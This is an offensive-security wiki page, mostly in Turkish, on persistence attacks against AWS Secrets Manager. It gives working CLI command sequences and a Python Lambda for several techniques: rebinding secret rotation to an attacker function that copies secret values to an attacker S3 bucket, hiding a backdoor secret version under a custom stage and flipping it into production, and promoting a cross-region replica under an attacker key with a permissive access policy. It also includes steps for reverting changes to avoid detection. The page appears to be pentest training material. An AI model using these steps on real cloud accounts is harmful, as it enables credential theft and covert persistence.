# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Daha fazla bilgi için bakın:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Resource Policies ile

Resource policy'ler aracılığıyla **secrets'e harici hesaplara erişim verme** mümkündür. Daha fazla bilgi için [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) sayfasına bakın. Bir secret'e **erişmek** için dış hesabın ayrıca secret'i şifreleyen KMS anahtarına da **erişimi olması gerektiğini** unutmayın.

### Secrets Rotate Lambda ile

Secret'leri otomatik olarak **rotate** etmek için yapılandırılmış bir **Lambda** çağrılır. Eğer bir saldırgan **kodu değiştirebilirse** yeni secret'i doğrudan kendine **exfiltrate** edebilir.

Böyle bir eylem için lambda kodu şu şekilde görünebilir:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
### RotateSecret ile döndürme Lambda'sını saldırgan kontrollü bir işleve değiştirin

secretsmanager:RotateSecret'ı kötüye kullanarak bir secret'ı saldırgan kontrolündeki rotation Lambda'ya yeniden bağlayın ve anlık bir rotation tetikleyin. Kötü amaçlı fonksiyon rotation adımları sırasında (createSecret/setSecret/testSecret/finishSecret) secret sürümlerini (AWSCURRENT/AWSPENDING) bir saldırgan hedefe (ör. S3 veya harici HTTP) exfiltrates eder.

- Gereksinimler
- İzinler: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` saldırgan Lambda'sı üzerinde, Lambda yürütme rolünü sağlamak için `iam:CreateRole/PassRole/PutRolePolicy` (veya AttachRolePolicy) ile birlikte `secretsmanager:GetSecretValue` ve tercihen `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (böylece rotation çalışmaya devam eder), secret KMS anahtarı için KMS `kms:Decrypt`, ve exfiltration için `s3:PutObject` (veya dışa giden egress).
- Rotation etkinleştirilmiş veya rotation'ı etkinleştirme yeteneğine sahip hedef bir secret id'si (`SecretId`).

- Etki
- Saldırgan, meşru rotation kodunu değiştirmeden secret değer(lerini) elde eder. Yalnızca rotation yapılandırması saldırgan Lambda'sına işaret edecek şekilde değiştirilir. Farkedilmezse, planlanmış sonraki rotasyonlar da saldırganın fonksiyonunu çağırmaya devam edecektir.

- Saldırı adımları (CLI)
1) Saldırgan hedefi ve Lambda rolünü hazırlayın
- Exfiltration için bir S3 bucket oluşturun ve Lambda tarafından güvenilen, secret'i okumak ve S3'e yazmak için izinlere sahip bir yürütme rolü oluşturun (gerektiğinde logs/KMS izinleri dahil).
2) Her rotation adımında secret değerlerini alıp S3'e yazan saldırgan Lambda'yı dağıtın. Minimum rotation mantığı, hizmetin sağlıklı kalması için AWSCURRENT'i AWSPENDING'e kopyalamak ve finishSecret içinde yükseltmek kadar basit olabilir.
3) Rotation'ı yeniden bağlayın ve tetikleyin
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) İlgili secret için S3 prefix'ini listeleyerek ve JSON artefaktlarını inceleyerek exfiltration'ı doğrulayın.
5) (İsteğe bağlı) Tespiti azaltmak için orijinal rotation Lambda'sını geri yükleyin.

- Örnek saldırgan Lambda (Python) — S3'e exfiltrating
- Environment: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Secrets Manager sürüm aşama etiketlerini kötüye kullanarak saldırgan tarafından kontrol edilen bir secret sürümü yerleştirin ve bunu üretimin orijinal `AWSCURRENT`'ı kullanmaya devam ettiği sırada özel bir aşama altında (ör. `ATTACKER`) gizli tutun. İstediğiniz herhangi bir anda `AWSCURRENT`'ı saldırganın sürümüne taşıyıp bağımlı iş yüklerini zehirleyin, sonra tespiti en aza indirmek için geri yükleyin. Bu, secret adı veya rotation yapılandırmasını değiştirmeden gizli bir backdoor kalıcılığı ve hızlı kullanım-zamanı manipülasyonu sağlar.

- Requirements
- Permissions: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (for verification)
- Target secret id in the Region.

- Impact
- Gizli, saldırgan tarafından kontrol edilen bir secret sürümünü koruyun ve talep üzerine atomik olarak `AWSCURRENT`'ı ona çevirin; aynı secret adını çözen herhangi bir tüketiciyi etkiler. Bu flip ve hızlı geri alma, tespit edilme şansını azaltırken kullanım-zamanı ihlaline imkan tanır.

- Attack steps (CLI)
- Preparation
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI komutları</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Notlar
- `--client-request-token` sağladığınızda, Secrets Manager bunu `VersionId` olarak kullanır. Yeni bir sürüm ekleyip `--version-stages`'i açıkça ayarlamazsanız, varsayılan olarak `AWSCURRENT` yeni sürüme taşınır ve önceki sürüm `AWSPREVIOUS` olarak işaretlenir.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Secrets Manager'ın multi-Region replication özelliğini suistimal ederek hedef bir secret'ın daha az izlenen bir Region'a replikasını oluşturun, o Region'da attacker-controlled KMS anahtarıyla şifreleyin, ardından replikayı standalone bir secret olarak promote edin ve attacker'e okuma erişimi veren permissive resource policy ekleyin. Birincil Region'daki orijinal secret değişmeden kalır; bu sayede birincilin KMS/policy kısıtlamalarını atlayarak yükseltilmiş replikadan secret değerine kalıcı ve gizli erişim sağlanır.

- Gereksinimler
- Permissions: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- Replika Region'da: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (veya `kms:PutKeyPolicy`) ile attacker principal'ın `kms:Decrypt` yapmasına izin verilmeli.
- Yükseltilmiş secret'e okuma erişimi verilecek bir attacker principal (user/role).

- Etki
- Attacker-controlled KMS CMK ve permissive resource policy altında, standalone bir replika üzerinden secret değerine kalıcı çapraz-Region erişim yolu. Orijinal Region'daki primary secret etkilenmez.

- Attack (CLI)
- Vars
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) attacker-controlled KMS key'i replica Region'da oluşturun
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) attacker KMS key kullanarak secret'i R2'ye çoğaltın
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) R2'de replikayı bağımsız hale getirin
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) R2'deki standalone secret'e permissive resource policy ekle
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) R2'deki attacker principal'dan secret'i oku
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```
{{#include ../../../../banners/hacktricks-training.md}}
